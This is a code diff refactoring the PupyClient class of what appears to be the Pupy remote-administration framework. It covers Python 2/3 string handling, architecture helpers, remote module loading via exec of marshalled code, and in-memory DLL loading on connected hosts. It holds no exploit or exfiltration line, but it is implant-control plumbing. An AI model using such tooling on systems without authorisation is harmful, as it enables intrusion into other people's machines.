@@ -49,8 +49,10 @@ from .PupyTriggers import event
 
 from .payloads import dependencies
 from .utils.rpyc_utils import obtain
+from .utils.arch import make_os_arch, make_proc_arch
 
 from network.lib.rpc import nowait
+from network.lib.convcompat import as_attr_type, unicodify
 
 from . import getLogger
 logger = getLogger('client')
@@ -60,23 +62,22 @@ if sys.version_info.major > 2:
 
     def reprb(data):
         return repr(data)
+
 else:
     def reprb(data):
         return 'b' + repr(data)
 
 
+def as_str(data):
+    if isinstance(data, bytes):
+        return data.decode('utf-8')
+
+    return data
+
+
 class PupyClient(object):
     def __init__(self, desc, pupsrv):
-        if sys.version_info.major > 2:
-            self.desc = dict(desc)
-        else:
-            self.desc = {
-                (
-                    k.encode('utf-8') if type(k) == unicode else k
-                ):(
-                    v.encode('utf-8') if type(v) == unicode else v
-                ) for k,v in desc.items()
-            }
+        self.desc = unicodify(desc)
 
         if __debug__:
             logger.debug(
@@ -84,9 +85,20 @@ class PupyClient(object):
                 desc, type(desc), self.desc, type(self.desc)
             )
 
-        #alias
+        # alias
         self.conn = self.desc['conn']
-        self.native = self.desc['native']
+
+        self.is3to2 = (
+            self.conn.remote_version[0] == 2 and
+            sys.version_info.major == 3
+        )
+
+        self.target = dependencies.Target(
+            self.conn.remote_version,
+            (
+                self.platform, self.arch
+            )
+        )
 
         self.conn.events_receiver = self._event_receiver
 
@@ -104,13 +116,13 @@ class PupyClient(object):
 
         self.load_pupyimporter()
 
-        #to reuse impersonated handle in other modules
+        # To reuse impersonated handle in other modules
         self.impersonated_dupHandle = None
 
     def __str__(self):
-        return 'PupyClient(id=%s, user=%s, hostname=%s, platform=%s)'%(
-            self.desc["id"], self.desc["user"],
-            self.desc["hostname"], self.desc["platform"]
+        return '{PupyClient(id=%s, user=%s, hostname=%s, target=%s)}' % (
+            self.desc['id'], self.desc['user'],
+            self.desc['hostname'], self.target
         )
 
     @property
@@ -122,7 +134,7 @@ class PupyClient(object):
 
     def get_conf(self):
         return {
-            k:v for k,v in self.desc.items() if k in (
+            k: v for k, v in self.desc.items() if k in (
                 'offline_script', 'launcher', 'launcher_args',
                 'cid', 'debug'
             )
@@ -134,11 +146,11 @@ class PupyClient(object):
                 self.desc['platform'][0:3].lower(),
                 self.desc['hostname'],
                 self.desc.get(
-                    'node', self.desc['macaddr'].replace(':',''))
+                    'node', self.desc['macaddr'].replace(':', ''))
             ])
 
         except Exception:
-            return "unknown"
+            return 'unknown'
 
     def node(self):
         return self.desc['macaddr'].replace(':', '').lower()
@@ -150,24 +162,24 @@ class PupyClient(object):
         return self.desc['os_name'].lower() == 'posix'
 
     def is_linux(self):
-        return "linux" in self.desc["platform"].lower()
+        return 'linux' in self.desc['platform'].lower()
 
     def is_java(self):
-        return "java" in self.desc["platform"].lower()
+        return 'java' in self.desc['platform'].lower()
 
     def is_android(self):
-        return self.desc["platform"].lower()=="android"
+        return self.desc['platform'].lower() == 'android'
 
     def is_windows(self):
-        if "windows" in self.desc["platform"].lower():
+        if 'windows' in self.desc['platform'].lower():
             return True
         return False
 
     def is_solaris(self):
-        return "sunos" in self.desc["platform"].lower()
+        return 'sunos' in self.desc['platform'].lower()
 
     def is_darwin(self):
-        if "darwin" in self.desc["platform"].lower():
+        if 'darwin' in self.desc['platform'].lower():
             return True
         return False
 
@@ -188,71 +200,15 @@ class PupyClient(object):
 
     @property
     def os_arch(self):
-        arch = self.desc['os_arch'].lower()
-        substitute = {
-            'x86_64': 'amd64',
-            'i386': 'x86',
-            'i686': 'x86',
-            'i486': 'x86',
-            'armv7l': 'armhf'
-        }
-        return substitute.get(arch, arch)
+        return make_os_arch(
+            self.desc['os_arch'].lower()
+        )
 
     @property
     def arch(self):
-        os_arch_to_platform = {
-            'amd64': 'intel',
-            'x86': 'intel',
-            'i86pc': 'sun-intel',
-            'armhf': 'armhf',
-            'aarch64': 'arm',
-        }
-
-        os_platform_to_arch = {
-            'intel': {
-                '32bit': 'x86',
-                '64bit': 'amd64'
-            },
-            'sun-intel': {
-                # Yes.. Just one arch supported
-                # The script is for amd64
-                '32bit': 'i86pc',
-                '64bit': 'i86pc'
-            },
-            'armhf': {
-                '32bit': 'armhf',
-                '64bit': 'armhf'
-            },
-            'arm': {
-                '32bit': 'arm',
-                '64bit': 'aarch64'
-            }
-        }
-
-        if self.os_arch in os_arch_to_platform:
-            return os_platform_to_arch[
-                os_arch_to_platform[self.os_arch]
-            ][self.desc['proc_arch']]
-        else:
-            return None
-
-    def is_proc_arch_64_bits(self):
-        if "64" in self.desc["proc_arch"]:
-            return True
-        return False
-
-    def match_server_arch(self):
-        try:
-            return all([
-                self.desc['platform'] == HOST_SYSTEM,
-                self.desc['proc_arch'] == HOST_CPU_ARCH,
-                self.desc['os_arch'] == HOST_OS_ARCH
-            ])
-
-        except Exception as e:
-            logger.error(e)
-
-        return False
+        return make_proc_arch(
+            self.os_arch, self.desc['proc_arch']
+        )
 
     def remote(self, module, function=None, need_obtain=True):
         remote_module = None
@@ -271,14 +227,24 @@ class PupyClient(object):
                 if function in self.remotes[module]:
                     remote_function = self.remotes[module][function]
                 else:
-                    remote_function = getattr(self.conn.modules[module], function)
+                    remote_function = getattr(
+                        self.conn.modules[module], function
+                    )
                     self.remotes[module][function] = remote_function
 
         if function and need_obtain:
             if self.obtain_call:
-                return lambda *args, **kwargs: self.obtain_call(remote_function, *args, **kwargs)
+
+                def _call_wrapper(*args, **kwargs):
+                    return self.obtain_call(remote_function, *args, **kwargs)
+
+                return _call_wrapper
+
             else:
-                return lambda *args, **kwargs: obtain(remote_function(*args, **kwargs))
+                def _call_wrapper(*args, **kwargs):
+                    return obtain(remote_function(*args, **kwargs))
+
+                return _call_wrapper
 
         elif function:
             return remote_function
@@ -302,7 +268,9 @@ class PupyClient(object):
             if variable in self.remotes[module]:
                 remote_variable = self.remotes[module][variable]
             else:
-                remote_variable = obtain(getattr(self.conn.modules[module], variable))
+                remote_variable = obtain(
+                    getattr(self.conn.modules[module], variable)
+                )
                 self.remotes[module][variable] = remote_variable
 
         return remote_variable
@@ -320,8 +288,14 @@ class PupyClient(object):
                     'mod.__file__="<bootloader>/pupyimporter"',
                     'exec(marshal.loads({}), mod.__dict__)'.format(
                         reprb(pupycompile(
-                            path.join(ROOT, 'packages', 'all', 'pupyimporter.py'),
-                            'pupyimporter.py', path=True, raw=True))),
+                            path.join(
+                                ROOT, 'packages', 'all', 'pupyimporter.py'
+                            ),
+                            'pupyimporter.py',
+                            path=True, raw=True,
+                            target=self.target.pyver
+                        ))
+                    ),
                     'sys.modules["pupyimporter"]=mod',
                     'mod.install()']))
 
@@ -330,20 +304,33 @@ class PupyClient(object):
             self.pupyimporter = self.conn.pupyimporter
 
         if self.conn.register_remote_cleanup:
-            register_package_request_hook = nowait(self.pupyimporter.register_package_request_hook)
-            register_package_error_hook = nowait(self.pupyimporter.register_package_error_hook)
+            register_package_request_hook = nowait(
+                self.pupyimporter.register_package_request_hook
+            )
 
-            self.conn.register_remote_cleanup(self.pupyimporter.unregister_package_request_hook)
-            register_package_request_hook(self.remote_load_package)
+            register_package_error_hook = nowait(
+                self.pupyimporter.register_package_error_hook
+            )
 
-            self.conn.register_remote_cleanup(self.pupyimporter.unregister_package_error_hook)
+            self.conn.register_remote_cleanup(
+                self.pupyimporter.unregister_package_request_hook
+            )
+
+            register_package_request_hook(
+                self.remote_load_package
+            )
+
+            self.conn.register_remote_cleanup(
+                self.pupyimporter.unregister_package_error_hook
+            )
+
             register_package_error_hook(self.remote_print_error)
 
         self.pupy_load_dll = getattr(self.pupyimporter, 'load_dll', None)
-        self.new_dlls = getattr(self.pupyimporter, 'new_dlls', None)
-        self.new_modules = getattr(self.pupyimporter, 'new_modules', None)
         self.remote_add_package = nowait(self.pupyimporter.pupy_add_package)
-        self.remote_invalidate_package = nowait(self.pupyimporter.invalidate_module)
+        self.remote_invalidate_package = nowait(
+            self.pupyimporter.invalidate_module
+        )
 
         if self.conn.obtain_call:
             def obtain_call(function, *args, **kwargs):
@@ -362,25 +349,52 @@ class PupyClient(object):
             self.obtain_call = obtain_call
 
         if self.obtain_call:
-            self.imported_modules = set(self.obtain_call(
-                self.conn.modules.sys.modules.keys))
+            self.imported_modules = set(
+                as_attr_type(name) for name in self.obtain_call(
+                    self.conn.modules.sys.modules.keys
+                )
+            )
             self.cached_modules = set(
-                self.obtain_call(self.pupyimporter.modules.keys))
+                as_attr_type(name) for name in self.obtain_call(
+                    self.pupyimporter.modules.keys
+                )
+            )
         else:
-            self.imported_modules = set(obtain(self.conn.modules.sys.modules.keys()))
-            self.cached_modules = set(obtain(self.pupyimporter.modules.keys()))
+            self.imported_modules = set(
+                as_attr_type(name) for name in obtain(
+                    self.conn.modules.sys.modules.keys()
+                )
+            )
 
+            self.cached_modules = set(
+                as_attr_type(name) for name in obtain(
+                    self.pupyimporter.modules.keys()
+                )
+            )
+
+        try:
+            self.new_dlls = self.remote('pupyimporter', 'new_dlls')
+        except AttributeError:
+            self.new_dlls = False
+
+        try:
+            self.new_modules = self.remote('pupyimporter', 'new_modules')
+        except AttributeError:
+            self.new_modules = False
 
     def load_dll(self, modpath):
         """
-            load some dll from memory like sqlite3.dll needed for some .pyd to work
-            Don't load pywintypes27.dll and pythoncom27.dll with this. Use load_package("pythoncom") instead
+        load some dll from memory like sqlite3.dll needed for some .pyd to work
+        Don't load pywintypes27.dll and pythoncom27.dll with this. Use
+        load_package("pythoncom") instead
         """
+
         name = path.basename(modpath)
         if name in self.imported_dlls:
             return False
 
-        buf = dependencies.dll(name, self.platform, self.arch, native=self.native)
+        buf = dependencies.dll(self.target, name)
+
         if not buf:
             raise ImportError('Shared object {} not found'.format(name))
 
@@ -423,18 +437,20 @@ class PupyClient(object):
                 logger.debug('Request new dlls for %s', modules)
                 return self.new_dlls(tuple(modules))
             else:
-                return [
-                    module for module in modules if module not in self.imported_dlls
-                ]
+                return tuple(
+                    module for module in modules
+                    if module not in self.imported_dlls
+                )
         else:
             logger.debug('Request new modules for %s', modules)
 
             if self.new_modules:
                 new_modules = self.new_modules(tuple(modules))
             else:
-                new_modules = [
-                    module for module in modules if not self.pupyimporter.has_module(module)
-                ]
+                new_modules = tuple(
+                    module for module in modules
+                    if not self.pupyimporter.has_module(module)
+                )
 
             for module in modules:
                 if module not in new_modules:
@@ -486,18 +502,21 @@ class PupyClient(object):
 
         return invalidated
 
-    def load_package(self, requirements, force=False, remote=False, new_deps=[], honor_ignore=True):
+    def load_package(
+        self, requirements, force=False, remote=False, new_deps=[],
+            honor_ignore=True, target=None):
         try:
             forced = None
             if force:
                 forced = set()
 
             packages, contents, dlls = dependencies.package(
-                requirements, self.platform, self.arch, remote=remote,
-                posix=self.is_posix(), honor_ignore=honor_ignore,
+                self.target, requirements,
+                remote=remote,
+                honor_ignore=honor_ignore,
                 filter_needed_cb=lambda modules, dll: self.filter_new_modules(
                     modules, dll, forced, remote
-                ), native=self.native
+                )
             )
 
             self.cached_modules.update(contents)
@@ -506,10 +525,12 @@ class PupyClient(object):
             raise ValueError('Module not found: {}'.format(e))
 
         if remote:
-            logger.info('load_package(%s) -> p:%s d:%s',
+            logger.info(
+                'load_package(%s) -> p:%s d:%s',
                 requirements,
                 len(packages) if packages else None,
-                len(dlls) if dlls else None)
+                len(dlls) if dlls else None
+            )
 
             return packages, dlls
 
@@ -551,6 +572,8 @@ class PupyClient(object):
             self.remote_invalidate_module(module_name)
 
     def remote_load_package(self, module_name):
+        module_name = as_attr_type(module_name)
+
         logger.info('remote_load_package for %s started', module_name)
 
         try:
